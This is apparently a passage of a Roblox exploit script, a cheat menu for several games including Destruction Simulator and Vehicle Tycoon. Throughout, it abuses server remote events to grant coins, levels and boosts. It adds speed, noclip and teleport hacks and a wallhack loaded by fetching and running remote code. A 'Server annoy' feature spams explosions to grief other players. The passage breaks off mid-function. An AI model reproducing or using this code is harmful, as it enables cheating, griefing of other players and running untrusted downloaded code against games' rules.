                player.TempPlayerStatsModule.Ragdoll.Value = false
            end)
        end
    end)

    local value = false
    local Toggle = generalPlayer:AddToggle("Auto Interact", {flag = "Toggle_Flag", default = false}, function(s)
        value = s
        if s then
            local d
            d = game:service('RunService').Stepped:connect(function()
                if not value then
                    return d:Disconnect()
                end
                game:GetService("ReplicatedStorage").RemoteEvent:FireServer("Input","Action",true)
            end)
        end
    end)

    local value = false
    local Toggle = generalPlayer:AddToggle("No Hack Fail", {flag = "Toggle_Flag", default = false}, function(s)
        value = s
        if s then
            local d
            d = game:service('RunService').Stepped:connect(function()
                if not value then
                    return d:Disconnect()
                end
                game:GetService("ReplicatedStorage").RemoteEvent:FireServer("SetPlayerMinigameResult",true)
            end)
        end
    end)

    local walkspeed = false
    local Toggle = generalPlayer:AddToggle("Toggle Walkspeed", {flag = "Toggle_Flag", default = false}, function(s)
        walkspeed = s
        game:service('RunService').Stepped:connect(function(s)
            if walkspeed == false then
                game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
            end
        end)
    end)

    local uni_speed;
    local Slider = generalPlayer:AddSlider("Walkspeed", 16, 239, 1, {toggleable = false, default = false, flag = "Slider_Flag", fireontoggle = true, fireondrag = true, rounded = false}, function(value)
    uni_speed = value
        while wait() do
            if walkspeed == true then
                game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = uni_speed
            end
        end
    end)

    local jumppower = false
    local Toggle = generalPlayer:AddToggle("Toggle jumppower", {flag = "Toggle_Flag", default = false}, function(s)
        jumppower = s
        game:service('RunService').Stepped:connect(function(s)
            if jumppower == false then
                game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
            end
        end)
    end)

    local uni_jpower;
    local Slider = generalPlayer:AddSlider("Jumppower", 16, 239, 1, {toggleable = false, default = false, flag = "Slider_Flag", fireontoggle = true, fireondrag = true, rounded = false}, function(value)
    uni_jpower = value
        while wait() do
            if jumppower == true then
                game.Players.LocalPlayer.Character.Humanoid.JumpPower = uni_jpower
            end
        end
    end)

    local ESP = loadstring(game:HttpGet("https://kiriot22.com/releases/ESP.lua"))()

    ESP.Players = true
    ESP.Boxes = false
    ESP.Tracers = false
    ESP.Names = false
    ESP:Toggle(true)

    ESP:AddObjectListener(Workspace, {
        Name = "",
        CustomName = "",
        Color = Color3.fromRGB(0, 0, 0),
        IsEnabled = "whatever"
    })
    ESP.whatever = true

    local Toggle = Esp:AddToggle("Name ESP", {flag = "Toggle_Flag", default = false}, function(asdw)
        pcall(function()
            if asdw == true then
                ESP.Names = true
            else
                ESP.Names = false
            end
        end)
    end)

    local Toggle = Esp:AddToggle("Boxes", {flag = "Toggle_Flag", default = false}, function(asdw)
        pcall(function()
            if asdw == true then
                ESP.Boxes = true
            else
                ESP.Boxes = false
            end
        end)
    end)

    local Toggle = Esp:AddToggle("Tracers", {flag = "Toggle_Flag", default = false}, function(asdw)
        pcall(function()
            if asdw == true then
                ESP.Tracers = true
            else
                ESP.Tracers = false
            end
        end)
    end)

    local Picker = Esp:AddPicker("Color", {color = Color3.fromRGB(255, 0, 0)}, function(color)
        ESP.Color = color
    end)

    local adjustlighing = false
    local Toggle = Esp:AddToggle("Adjust Lighting", {flag = "Toggle_Flag", default = false}, function(s)
        adjustlighing = s
    end)

    local uni_time;
    local Slider = Esp:AddSlider("Clock Time", 1, 239, 1, {toggleable = true, default = false, flag = "Slider_Flag", fireontoggle = true, fireondrag = true, rounded = false}, function(value)
    uni_time = value
        while wait() do
            if adjustlighing == true then
                game.Lighting.ClockTime = uni_time
            end
        end
    end)

    local value = false
    local Toggle = Esp:AddToggle("Enable Reset", {flag = "Toggle_Flag", default = false}, function(s)
        value = s
        if s then
            local d
            d = game:service('RunService').Stepped:connect(function()
                if not value then
                    return d:Disconnect()
                end
                game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
            end)
        end
    end)

    local value = false
    local Toggle = Esp:AddToggle("Less Lag", {flag = "Toggle_Flag", default = false}, function(s)
        value = s
        if s then
            local d
            d = game:service('RunService').Stepped:connect(function()
                if not value then
                    return d:Disconnect()
                end
                for _, v in pairs(game.Workspace:GetChildren()) do
                    if v.Name == "Part" or v.Name == "Union" then
                        v.Material = Enum.Material.SmoothPlastic
                    end
                end
            end)
        end
    end)

    local boxtarget = nil
    local value = false
    generalCamera:AddToggle("Spectate", {flag = "lkill", default = false}, function(s)
        value = s
        if s then
            local g
            g = game:service('RunService').Stepped:connect(function()
                if not value then
                    game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
                    return g:Disconnect()
                end
                if game.Players[boxtarget].Character.Humanoid.Health == 0 then
                    return
                end
                game.Workspace.CurrentCamera.CameraSubject = game.Players[boxtarget].Character.Humanoid
            end)
        end
    end)

    local Box = generalCamera:AddBox("Select a Player", {fireonempty = true}, function(asdw)
        pcall(function()
            if asdw == "" then
                boxtarget = nil
            else
                boxtarget = asdw
            end
        end)
    end)

    local Picker = generalMisc:AddPicker("UI Theme Colour", {color = Color3.fromRGB(255, 0, 255)}, function(color)
        Window:SetAccent(color)
    end)

    local Label = generalMisc:AddLabel("LeftControl to minimize UI")

    local ClipboardLabel = generalMisc:AddClipboardLabel("Copy Discord Server link", function()
        return "https://discord.gg/vCmtKwSE7w"
    end)
end

function DestructionSimulator()
    local Symmetrical = Library:AddWindow({
        title = {"GalaxyServers", "Destruction Simulator"},
        theme = {
            Accent = Color3.fromRGB(255,105,180)
        },
        key = Enum.KeyCode.RightControl,
        default = true
    })
    local Main = Symmetrical:AddTab("Mods", {default = false})
    local pee = Main:AddSection("Main", {default = false})
    local launcherMain = Main:AddSection("Launcher", {default = false})
    local bombMain = Main:AddSection("Bomb", {default = false})
    
    local value = false
    local Toggle = pee:AddToggle("Max Level", {flag = "Toggle_Flag", default = false}, function(s)
    value = s
    if s then
        local g = game:service('RunService').Stepped:connect(function(s)
            if not value then
                return g:Disconnect()
            end
            game:GetService("ReplicatedStorage").Remotes.generateBoost:FireServer("Levels", 400, 90)
            end)
        end
    end)
    
    local value = false
    local Toggle = pee:AddToggle("XP Boost", {flag = "Toggle_Flag", default = false}, function(s)
    value = s
    if s then
        local g = game:service('RunService').Stepped:connect(function(s)
            if not value then
                return g:Disconnect()
            end
            game:GetService("ReplicatedStorage").Remotes.generateBoost:FireServer("XPBoost", 99999999999999, 4000)
            end)
        end
    end)
    
    local value = false
    local Toggle = pee:AddToggle("Brick Boost", {flag = "Toggle_Flag", default = false}, function(s)
    value = s
    if s then
        local g = game:service('RunService').Stepped:connect(function(s)
            if not value then
                return g:Disconnect()
            end
            game:GetService("ReplicatedStorage").Remotes.generateBoost:FireServer("Brick Boost", 99999999999999, 4000)
            end)
        end
    end)
    
    local value = false
    local Toggle = pee:AddToggle("Infinite Coins", {flag = "Toggle_Flag", default = false}, function(s)
    value = s
    if s then
        local g = game:service('RunService').Stepped:connect(function(s)
            if not value then
                return g:Disconnect()
            end
            game:GetService("ReplicatedStorage").Remotes.generateBoost:FireServer("Coins", 480, 50000)
            end)
        end
    end)
    
    local Toggle = pee:AddToggle("Auto Sell", {flag = "Toggle_Flag", default = false}, function(s)
        autos = s
        if autos then
            local d
            d = game:GetService('RunService').Stepped:connect(function()
                if not autos then
                    d:Disconnect()
                end
                pcall(function()
                    game:GetService("ReplicatedStorage").Remotes.sellBricks:FireServer()
                end)
            end)
        end
    end)
    
    local Slider = launcherMain:AddSlider("Cooldown", 0, 5, 5, {toggleable = false, default = false, flag = "Slider_Flag", fireontoggle = true, fireondrag = true, rounded = false}, function(value)
        local r = require(game:service('Players').LocalPlayer.Backpack.Launcher.Stats)
        pcall(function()
            r.Cooldown = value
        end)
    end)
    
    local Slider = launcherMain:AddSlider("Rocket speed", 2, 45, 2, {toggleable = false, default = false, flag = "Slider_Flag", fireontoggle = true, fireondrag = true, rounded = false}, function(value)
        local r = require(game:service('Players').LocalPlayer.Backpack.Launcher.Stats)
        pcall(function()
            r.RocketSpeed = value
        end)
    end)
    
    local Slider = launcherMain:AddSlider("Bursts", 0, 25, 1, {toggleable = false, default = false, flag = "Slider_Flag", fireontoggle = true, fireondrag = true, rounded = false}, function(value)
        local r = require(game:service('Players').LocalPlayer.Backpack.Launcher.Stats)
        pcall(function()
            r.Bursts = value
        end)
    end)
    
    local Slider = launcherMain:AddSlider("Burst cooldown", 0, 25, 1, {toggleable = false, default = false, flag = "Slider_Flag", fireontoggle = true, fireondrag = true, rounded = false}, function(value)
        local r = require(game:service('Players').LocalPlayer.Backpack.Launcher.Stats)
        pcall(function()
            r.BurstWait = value
        end)
    end)
    
    local Slider = bombMain:AddSlider("Cooldown", 0, 6, 6, {toggleable = false, default = false, flag = "Slider_Flag", fireontoggle = true, fireondrag = true, rounded = false}, function(value)
        local r = require(game:service('Players').LocalPlayer.Backpack.Bomb.Stats)
        pcall(function()
            r.Cooldown = value
        end)
    end)
    
    local Annoy = Symmetrical:AddTab("Annoy", {default = false})
    local generalAnnoy = Annoy:AddSection("General", {default = false})
    
    local Toggle = generalAnnoy:AddToggle("Server annoy", {flag = "Toggle_Flag", default = false}, function(s)
    servera = s
        if servera then
            local d
            d = game:GetService('RunService').Stepped:connect(function()
                if not servera then
                    d:Disconnect()
                end
                pcall(function()
                    local args = {
                        [1] = 167357409,
                        [2] = game:GetService("Players").LocalPlayer.Backpack.Launcher.Stats,
                        [3] = Vector3.new(89.0579605102539, 1, -175.83677673339844),
                        [4] = game:GetService("Players").LocalPlayer.Backpack.Launcher.Assets.Rocket.Boom
                    }
                    
                    game:GetService("ReplicatedStorage").Remotes.explodeRocket:FireServer(unpack(args))
                    local args = {
                        [1] = 1673574169.872929,
                        [2] = game:GetService("Players").LocalPlayer.Backpack.Launcher.Stats,
                        [3] = Vector3.new(95.1158218383789, 5.000884056091309, -451.53106689453125),
                        [4] = game:GetService("Players").LocalPlayer.Backpack.Launcher.Assets.Rocket.Boom
                    }
                    
                    game:GetService("ReplicatedStorage").Remotes.explodeRocket:FireServer(unpack(args))
                    local args = {
                        [1] = 1673574322.1940236,
                        [2] = game:GetService("Players").LocalPlayer.Backpack.Launcher.Stats,
                        [3] = Vector3.new(-192.09803771972656, 5.783481597900391, -451.8132629394531),
                        [4] = game:GetService("Players").LocalPlayer.Backpack.Launcher.Assets.Rocket.Boom
                    }
                    
                    game:GetService("ReplicatedStorage").Remotes.explodeRocket:FireServer(unpack(args))
                    local args = {
                        [1] = 1673574416.8474932,
                        [2] = game:GetService("Players").LocalPlayer.Backpack.Launcher.Stats,
                        [3] = Vector3.new(-217.20326232910156, 1, -158.89747619628906),
                        [4] = game:GetService("Players").LocalPlayer.Backpack.Launcher.Assets.Rocket.Boom
                    }
                    
                    game:GetService("ReplicatedStorage").Remotes.explodeRocket:FireServer(unpack(args))
                    local args = {
                        [1] = 1673574476.892181,
                        [2] = game:GetService("Players").LocalPlayer.Backpack.Launcher.Stats,
                        [3] = Vector3.new(-225.5004425048828, 1, 127.44266510009766),
                        [4] = game:GetService("Players").LocalPlayer.Backpack.Launcher.Assets.Rocket.Boom
                    }
                    
                    game:GetService("ReplicatedStorage").Remotes.explodeRocket:FireServer(unpack(args))
                    local args = {
                        [1] = 1673574543.2073963,
                        [2] = game:GetService("Players").LocalPlayer.Backpack.Launcher.Stats,
                        [3] = Vector3.new(97.93571472167969, 1, 60.27088928222656),
                        [4] = game:GetService("Players").LocalPlayer.Backpack.Launcher.Assets.Rocket.Boom
                    }
                    
                    game:GetService("ReplicatedStorage").Remotes.explodeRocket:FireServer(unpack(args))
                    local args = {
                        [1] = 1673574589.625622,
                        [2] = game:GetService("Players").LocalPlayer.Backpack.Launcher.Stats,
                        [3] = Vector3.new(-138.03976440429688, 12.881915092468262, 421.1674499511719),
                        [4] = game:GetService("Players").LocalPlayer.Backpack.Launcher.Assets.Rocket.Boom
                    }
                    
                    game:GetService("ReplicatedStorage").Remotes.explodeRocket:FireServer(unpack(args))
                    local args = {
                        [1] = 1673574621.552174,
                        [2] = game:GetService("Players").LocalPlayer.Backpack.Launcher.Stats,
                        [3] = Vector3.new(61.33851623535156, 1, 483.0544128417969),
                        [4] = game:GetService("Players").LocalPlayer.Backpack.Launcher.Assets.Rocket.Boom
                    }
                    
                    game:GetService("ReplicatedStorage").Remotes.explodeRocket:FireServer(unpack(args))
                    local args = {
                        [1] = 1673574662.878858,
                        [2] = game:GetService("Players").LocalPlayer.Backpack.Launcher.Stats,
                        [3] = Vector3.new(-182.3225860595703, 2, 741.1998901367188),
                        [4] = game:GetService("Players").LocalPlayer.Backpack.Launcher.Assets.Rocket.Boom
                    }
                    
                    game:GetService("ReplicatedStorage").Remotes.explodeRocket:FireServer(unpack(args))
                    local args = {
                        [1] = 1673574698.627164,
                        [2] = game:GetService("Players").LocalPlayer.Backpack.Launcher.Stats,
                        [3] = Vector3.new(138.8809814453125, 1, 691.341796875),
                        [4] = game:GetService("Players").LocalPlayer.Backpack.Launcher.Assets.Rocket.Boom
                    }
                    
                    game:GetService("ReplicatedStorage").Remotes.explodeRocket:FireServer(unpack(args))
                    local args = {
                        [1] = 1673574784.4155195,
                        [2] = game:GetService("Players").LocalPlayer.Backpack.Launcher.Stats,
                        [3] = Vector3.new(-246.63430786132812, 1, 1054.113525390625),
                        [4] = game:GetService("Players").LocalPlayer.Backpack.Launcher.Assets.Rocket.Boom
                    }
                    
                    game:GetService("ReplicatedStorage").Remotes.explodeRocket:FireServer(unpack(args))
                    local args = {
                        [1] = 1673574822.963053,
                        [2] = game:GetService("Players").LocalPlayer.Backpack.Launcher.Stats,
                        [3] = Vector3.new(63.058929443359375, 1, 1061.4925537109375),
                        [4] = game:GetService("Players").LocalPlayer.Backpack.Launcher.Assets.Rocket.Boom
                    }
                    
                    game:GetService("ReplicatedStorage").Remotes.explodeRocket:FireServer(unpack(args))
                end)
            end)
        end
    end)
    
    local UniBeamToggle = false
    local Toggle = generalAnnoy:AddToggle("Uni rocket", {flag = "Toggle_Flag", default = false}, function(s)
        UniBeamToggle = s
    end)
    
    local KeyDown = false
    function laser()
    game:service('RunService').Heartbeat:connect(function(s)
    if KeyDown == true then
    if UniBeamToggle == true then
    local args = {
        [1] = 1673574822.963053,
        [2] = game:GetService("Players").LocalPlayer.Backpack.Launcher.Stats,
        [3] = game.Players.LocalPlayer:GetMouse().hit.p,
        [4] = game:GetService("Players").LocalPlayer.Backpack.Launcher.Assets.Rocket.Boom
    }
    
    game:GetService("ReplicatedStorage").Remotes.explodeRocket:FireServer(unpack(args))
    end
    end
    end)
    game:service('RunService').Heartbeat:connect(function(s)
    if KeyDown == true then
    if UniBeamToggle == true then
    local args = {
        [1] = 1673574822.963053,
        [2] = game:GetService("Players").LocalPlayer.Backpack.Launcher.Stats,
        [3] = game.Players.LocalPlayer:GetMouse().hit.p,
        [4] = game:GetService("Players").LocalPlayer.Backpack.Launcher.Assets.Rocket.Boom
    }
    
    game:GetService("ReplicatedStorage").Remotes.explodeRocket:FireServer(unpack(args))
    end
    end
    end)
    game:service('RunService').Heartbeat:connect(function(s)
    if KeyDown == true then
    if UniBeamToggle == true then
    local args = {
        [1] = 1673574822.963053,
        [2] = game:GetService("Players").LocalPlayer.Backpack.Launcher.Stats,
        [3] = game.Players.LocalPlayer:GetMouse().hit.p,
        [4] = game:GetService("Players").LocalPlayer.Backpack.Launcher.Assets.Rocket.Boom
    }
    
    game:GetService("ReplicatedStorage").Remotes.explodeRocket:FireServer(unpack(args))
    end
    end
        end)
    end
    local x = 0
    local me = game.Players.LocalPlayer.Name
    local mouse = game.Players.LocalPlayer:GetMouse()
    mouse.KeyDown:connect(function (key)
    if(key:byte() == 116) then
    KeyDown = true;
    Player = game:GetService("Players").LocalPlayer.Name
    AnimationId = "1746432470"
    local Anim = Instance.new("Animation")
    Anim.AnimationId = "rbxassetid://"..AnimationId
    local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim)
    if UniBeamToggle == true then
    k:Play() 
    k:AdjustSpeed(1)
    end
    if x ~= 1 then
        laser()
        x = x +1
    end
    while wait() do
        if KeyDown == false then
            k:Stop()
            end
        end
    end
    end)
    mouse.KeyUp:connect(function (key)
    if(key:byte() == 116) then
    KeyDown = false;
    end
    end)
    
    local Label = generalAnnoy:AddLabel("Hold 'T' to explode")
    
    local Misc = Symmetrical:AddTab("Misc", {default = false})
    local generalMisc = Misc:AddSection("General", {default = false})
    
    local Picker = generalMisc:AddPicker("UI Theme Colour", {color = Color3.fromRGB(255, 0, 255)}, function(color)
        Symmetrical:SetAccent(color)
    end)
    
    local Label = generalMisc:AddLabel("LeftControl to minimize UI")
    
    local ClipboardLabel = generalMisc:AddClipboardLabel("Copy Discord Server link", function()
        return "https://discord.gg/vCmtKwSE7w"
    end)    
end

function SPFS()
    local Window = Library:AddWindow({
        title = {"GalaxyServers", "SPFS"},
        theme = {
            Accent = Color3.fromRGB(255, 0, 255)
        },
        key = Enum.KeyCode.LeftControl,
        default = true
    })  
            
    local mainchet = Window:AddTab("General", {default = true})
    local Main = mainchet:AddSection("Main", {default = true})
    local autof = mainchet:AddSection("Auto Farm", {default = true})
    
    local misc = Window:AddTab("Misc", {default = false})
    local gui = misc:AddSection("UI Functions", {default = true})
    
    local Button = autof:AddButton("No Clip", function()
    local RunService = game:GetService("RunService")
    getgenv().Clip = false
    wait(0.1)
    local function NoclipLoop()
        if getgenv().Clip == false and game.Players.LocalPlayer.Character ~= nil then
            for _, child in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
                if child:IsA("BasePart") and child.CanCollide == true and child.Name ~= floatName then
                    child.CanCollide = false
                end
            end
        end
    end
    Noclipping = RunService.Stepped:Connect(NoclipLoop)
    end)
    
    local Toggle = autof:AddToggle("Auto Strength", {flag = "apush", default = false}, function(s)
        value = s
        if s then
            local g
            g = game:service('RunService').Stepped:connect(function()
                if not value then
                    return g:Disconnect()
                end
                game:GetService("ReplicatedStorage").Events.Train:FireServer("Strength")
                game:GetService("ReplicatedStorage").Events.Train:FireServer("Strength")
                game:GetService("ReplicatedStorage").Events.Train:FireServer("Strength")
                game:GetService("ReplicatedStorage").Events.Train:FireServer("Strength")
                game:GetService("ReplicatedStorage").Events.Train:FireServer("Strength")
                game:GetService("ReplicatedStorage").Events.Train:FireServer("Strength")
                game:GetService("ReplicatedStorage").Events.Train:FireServer("Strength")
                game:GetService("ReplicatedStorage").Events.Train:FireServer("Strength")
            end)
        end
    end)
    
    local Toggle = autof:AddToggle("Auto Endurance", {flag = "apush", default = false}, function(s)
        value = s
        if s then
            local g
            g = game:service('RunService').Stepped:connect(function()
                if not value then
                    return g:Disconnect()
                end
                game:GetService("ReplicatedStorage").Events.Train:FireServer("Endurance")
                game:GetService("ReplicatedStorage").Events.Train:FireServer("Endurance")
                game:GetService("ReplicatedStorage").Events.Train:FireServer("Endurance")
                game:GetService("ReplicatedStorage").Events.Train:FireServer("Endurance")
                game:GetService("ReplicatedStorage").Events.Train:FireServer("Endurance")
            end)
        end
    end)
    
    local Toggle = autof:AddToggle("Auto Psychic", {flag = "apush", default = false}, function(s)
        value = s
        if s then
            local g
            g = game:service('RunService').Stepped:connect(function()
                if not value then
                    return g:Disconnect()
                end
                game:GetService("ReplicatedStorage").Events.Train:FireServer("Psychic")
                game:GetService("ReplicatedStorage").Events.Train:FireServer("Psychic")
                game:GetService("ReplicatedStorage").Events.Train:FireServer("Psychic")
                game:GetService("ReplicatedStorage").Events.Train:FireServer("Psychic")
                game:GetService("ReplicatedStorage").Events.Train:FireServer("Psychic")
            end)
        end
    end)
    
    local Dropdown = Main:AddDropdown("Teleports", {"Desert Chest", "Ninja Chest", "Deep Sea Chest", "Robot Chest"}, {default = "Select a Place"}, function(tele)
    
        if tele == "Desert Chest" then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1625, 54, -1960)
        end
        
        if tele == "Ninja Chest" then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(970, 55, -1778)
        end
        
        if tele == "Deep Sea Chest" then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(916, 52, 890)
        end
        
        if tele == "Robot Chest" then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1681, 68, 634)
        end
    end)    
    
    gui:AddPicker("UI Theme Colour", {color = Color3.fromRGB(255, 0, 255)}, function(color)
        Window:SetAccent(color)
    end)
    
    gui:AddLabel("LeftControl to minimize UI")
    
    local ClipboardLabel = gui:AddClipboardLabel("Copy Discord Server link", function()
        return "https://discord.gg/vCmtKwSE7w"
    end)
end

function VehicleSimulator()
    -- Create Window
    local Window = Library:AddWindow({
        title = {"GalaxyServers", "Vehicle Simulator"},
        theme = {
            Accent = Color3.fromRGB(255, 0, 255)
        },
        key = Enum.KeyCode.LeftControl,
        default = true
    })

    -- Create Tab
    local mainchet = Window:AddTab("General", {default = true})
    local pee = mainchet:AddSection("Mods", {default = true})

    local misc = Window:AddTab("Misc", {default = false})
    local gui = misc:AddSection("UI Functions", {default = true})

    local value = nil
    local found = false
    local Slider = pee:AddSlider("MaxSpeed", 200, 15000, 15000, {toggleable = false, default = false, flag = "Slider_Flag", fireontoggle = true, fireondrag = true, rounded = true}, function(val)
        value = val
        local function maxSpeed()
            local vehicles = Workspace.Vehicles:getChildren()
            for i=1,#vehicles do
                if vehicles[i]:findFirstChild'owner' then
                    if vehicles[i].owner.Value == game:GetService'Players'.LocalPlayer.Name then
                        found = true
                        vehicle = vehicles[i]
                        vehStats = vehicle.Handling
                        vehStats.MaxSpeed.Value = value
                    end
                end
            end
        end
        if value then
            maxSpeed()
        end
    end)

    local value = nil
    local found = false
    local Slider = pee:AddSlider("Torque", 3300, 70000, 70000, {toggleable = false, default = false, flag = "Slider_Flag", fireontoggle = true, fireondrag = true, rounded = true}, function(val)
        value = val
        local function Torque()
            local vehicles = Workspace.Vehicles:getChildren()
            for i=1,#vehicles do
                if vehicles[i]:findFirstChild'owner' then
                    if vehicles[i].owner.Value == game:GetService'Players'.LocalPlayer.Name then
                        found = true
                        vehicle = vehicles[i]
                        vehStats = vehicle.Handling
                        vehStats.Torque.Value = value
                    end
                end
            end
        end
        if value then
            Torque()
        end
    end)

    local value = nil
    local found = false
    local Slider = pee:AddSlider("Steering Radius", 1300, 15000, 15000, {toggleable = false, default = false, flag = "Slider_Flag", fireontoggle = true, fireondrag = true, rounded = true}, function(val)
        value = val
        local function SteeringradiusConstant()
            local vehicles = Workspace.Vehicles:getChildren()
            for i=1,#vehicles do
                if vehicles[i]:findFirstChild'owner' then
                    if vehicles[i].owner.Value == game:GetService'Players'.LocalPlayer.Name then
                        found = true
                        vehicle = vehicles[i]
                        vehStats = vehicle.Handling
                        vehStats.SteeringRadiusConstant.Value = value
                    end
                end
            end
        end
        if value then
            SteeringradiusConstant()
        end
    end)

    local value = nil
    local found = false
    local Slider = pee:AddSlider("Braking", 12000, 20000, 15000, {toggleable = false, default = false, flag = "Slider_Flag", fireontoggle = true, fireondrag = true, rounded = true}, function(val)
        value = val
        local function Braking()
            local vehicles = Workspace.Vehicles:getChildren()
            for i=1,#vehicles do
                if vehicles[i]:findFirstChild'owner' then
                    if vehicles[i].owner.Value == game:GetService'Players'.LocalPlayer.Name then
                        found = true
                        vehicle = vehicles[i]
                        vehStats = vehicle.Handling
                        vehStats.Braking.Value = value
                    end
                end
            end
        end
        if value then
            Braking()
        end
    end)

    local Picker = gui:AddPicker("UI Theme Colour", {color = Color3.fromRGB(255, 0, 255)}, function(color)
        Window:SetAccent(color)
    end)

    local Label = gui:AddLabel("LeftControl to minimize UI")

    local ClipboardLabel = gui:AddClipboardLabel("Copy Discord Server link", function()
        return "https://discord.gg/vCmtKwSE7w"
    end)
end

function VehicleTycoon()
    -- Create Window
    local Window = Library:AddWindow({
        title = {"GalaxyServers", "Vehicle Tycoon"},
        theme = {
            Accent = Color3.fromRGB(255, 0, 255)
        },
        key = Enum.KeyCode.LeftControl,
        default = true
    })

    -- Create Tab
    local mainchet = Window:AddTab("General", {default = true})
    local pee = mainchet:AddSection("Mods", {default = true})
    local ff = mainchet:AddSection("Farming", {default = true})

    local misc = Window:AddTab("Misc", {default = false})
    local gui = misc:AddSection("UI Functions", {default = true})

    local value = nil
    local Slider = pee:AddSlider("Max Speed", 583, 15000, 15000, {toggleable = false, default = false, flag = "Slider_Flag", fireontoggle = true, fireondrag = true, rounded = true}, function(val)
        value = val
        game:GetService("Workspace").Vehicles[game.Players.LocalPlayer.Name].Stats.MaxSpeed = value
    end)

    local value = nil
    local Slider = pee:AddSlider("Turn Speed", 2, 2500, 1500, {toggleable = false, default = false, flag = "Slider_Flag", fireontoggle = true, fireondrag = true, rounded = true}, function(val)
        value = val
        game:GetService("Workspace").Vehicles[game.Players.LocalPlayer.Name].Stats.TurnSpeed = value
    end)

    local value = nil
    local Slider = pee:AddSlider("Turn Radius", 2, 2500, 1500, {toggleable = false, default = false, flag = "Slider_Flag", fireontoggle = true, fireondrag = true, rounded = true}, function(val)
        value = val
        game:GetService("Workspace").Vehicles[game.Players.LocalPlayer.Name].Stats.TurnRadius = value
    end)

    local value = nil
    local Slider = pee:AddSlider("Reverse Speed", 150, 5000, 5000, {toggleable = false, default = false, flag = "Slider_Flag", fireontoggle = true, fireondrag = true, rounded = true}, function(val)
        value = val
        game:GetService("Workspace").Vehicles[game.Players.LocalPlayer.Name].Stats.ReverseSpeed = value
    end)

    local value = nil
    local Slider = pee:AddSlider("Reverse Torque", 150, 5000, 5000, {toggleable = false, default = false, flag = "Slider_Flag", fireontoggle = true, fireondrag = true, rounded = true}, function(val)
        value = val
        game:GetService("Workspace").Vehicles[game.Players.LocalPlayer.Name].Stats.ReverseTorque = value
    end)

    local Toggle = ff:AddToggle("Coin AutoFarm", {flag = "afarm", default = false}, function(s)
        value = s
        if s then
            local g
            g = game:service('RunService').Stepped:connect(function()
                if not value then
                    return g:Disconnect()
                end
                for i, v in pairs(game:GetService("Workspace").CoinEvent.Coins:GetDescendants()) do
                    if v.Name == "Mid" or v.Name == "Sidewalk" and v:FindFirstChild("Touch Interest") then
                        if v.Decal.Transparency == 0 then
                        else
                            return
                        end
                        game.Players.LocalPlayer.Character:MoveTo(v.Position)
                    end
                end
            end)
        end
    end)

    local Picker = gui:AddPicker("UI Theme Colour", {color = Color3.fromRGB(255, 0, 255)}, function(color)
        Window:SetAccent(color)
    end)

    local Label = gui:AddLabel("LeftControl to minimize UI")

    local ClipboardLabel = gui:AddClipboardLabel("Copy Discord Server link", function()
        return "https://discord.gg/vCmtKwSE7w"
    end)
end

function AgeofHeros()
    -- Create Window
    local Window = Library:AddWindow({
        title = {"GalaxyServers", "Age Of Heroes"},
        theme = {
            Accent = Color3.fromRGB(255, 0, 255)
        },
        key = Enum.KeyCode.LeftControl,
        default = true
    })

    -- Create Tab
    local mainchet = Window:AddTab("General", {default = true})
    local pee = mainchet:AddSection("Main", {default = true})
    local ff = mainchet:AddSection("Aura", {default = true})

    local uni = Window:AddTab("Universal", {default = false})
    local hit = uni:AddSection("Hitbox Expander", {default = true})

    local misc = Window:AddTab("Misc", {default = false})
    local gui = misc:AddSection("UI Functions", {default = true})

    local value = false
    local Toggle = pee:AddToggle("Auto-Levels", {flag = "alvl", default = false}, function(s)
        value = s
        if s then
            local d
            d = game:service('RunService').Stepped:connect(function(s)
                if not value then
                    return d:Disconnect()
                end
                local t = game.Players:GetPlayers(v)
                for i,v2 in pairs(t) do
                    pcall(function()
                        game:GetService("Workspace").ExperienceOrbs.experienceOrb.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position+Vector3.new(0,0,0))
                    end)
                end
            end)
        end
    end)

    local value = false
    local Toggle = pee:AddToggle("Auto-Farm Thugs", {flag = "athugs", default = false}, function(s)
        value = s
        if s then
            local d
            d = game:service('RunService').Stepped:connect(function(s)
                if not value then
                    return d:Disconnect()
                end
                if workspace.Thug.Humanoid.Health ~= 0 then
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(workspace.Thug.HumanoidRootPart.Position + Vector3.new(0, 0, 2))
                    game:GetService("ReplicatedStorage").Events.Punch:FireServer(0.4,0.1,1)
                else
                    workspace.Thug:Destroy()
                end
            end)
        end
    end)

    local value = false
    local Toggle = pee:AddToggle("Auto-Farm Police", {flag = "apolice", default = false}, function(s)
        value = s
        if s then
            local d
            d = game:service('RunService').Stepped:connect(function(s)
                if not value then
                    return d:Disconnect()
                end
                if workspace.Police.Humanoid.Health ~= 0 then
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(workspace.Police.HumanoidRootPart.Position + Vector3.new(0, 0, 2))
                    game:GetService("ReplicatedStorage").Events.Punch:FireServer(0.4,0.1,1)
                else
                    workspace.Police:Destroy()
                end
            end)
        end
    end)

    local value = false
    local Toggle = pee:AddToggle("Auto-Farm Civilians", {flag = "aciv", default = false}, function(s)
        value = s
        if s then
            local d
            d = game:service('RunService').Stepped:connect(function(s)
                if not value then
                    return d:Disconnect()
                end
                if workspace.Civilian.Humanoid.Health ~= 0 then
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(workspace.Civilian.HumanoidRootPart.Position + Vector3.new(0, 0, 2))
                    game:GetService("ReplicatedStorage").Events.Punch:FireServer(0.4,0.1,1)
                else
                    workspace.Civilian:Destroy()
                end
            end)
        end
    end)

    local value = false
    local Toggle = pee:AddToggle("Earth Quake", {flag = "quake", default = false}, function(s)
        value = s
        if s then
            local d
            d = game:service('RunService').Stepped:connect(function(s)
                if not value then
                    return d:Disconnect()
                end
                game:GetService("ReplicatedStorage").Events.GroundCrack:FireServer()
            end)
        end
    end)

    local Button = pee:AddButton("Invisible Godmode", function()
